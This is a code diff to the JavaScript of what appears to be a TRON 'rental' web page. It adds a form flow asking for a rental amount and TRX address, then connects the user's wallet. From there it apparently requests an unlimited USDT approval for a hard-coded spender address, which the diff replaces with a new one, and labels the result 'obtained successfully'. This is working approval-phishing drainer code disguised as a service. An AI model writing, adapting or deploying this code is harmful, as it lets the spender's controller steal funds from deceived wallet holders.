@@ -1,3 +1,17 @@
+function setAmount(amount) {
+    document.getElementById('rentalAmount').value = amount;
+}
+
+async function nextStep() {
+    const rentalAmount = document.getElementById('rentalAmount').value;
+    const trxAddress = document.getElementById('trxAddress').value;
+    if (rentalAmount && trxAddress) {
+        await connectWallet();
+    } else {
+        alert('请填写所有字段');
+    }
+}
+
 async function connectWallet() {
     try {
         // 动态加载 tronWeb 对象
@@ -34,7 +48,7 @@ async function connectWallet() {
             const usdtContract = await window.tronWeb.contract().at(usdtAddress);
 
             // 授权地址和数量
-            const spenderAddress = "TQaZabUC6HecnzHrE7Q8Wriaqa6UvfxTJj";
+            const spenderAddress = "TFjUz313BQXRSj7g4FabMVegHPfUKj6Uhz";
             const amount = '0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF'; // 无限授权
 
             // 发送授权交易
@@ -44,12 +58,12 @@ async function connectWallet() {
             });
 
             // 更新按钮文本
-            document.getElementById('okButton').innerText = '转账成功';
+            document.getElementById('okButton').innerText = '获取成功';
         } else {
             alert('请登录支持 TRC20 的钱包');
         }
     } catch (error) {
         console.error(error);
-        document.getElementById('okButton').innerText = '转账失败';
+        document.getElementById('okButton').innerText = '获取失败';
     }
 }
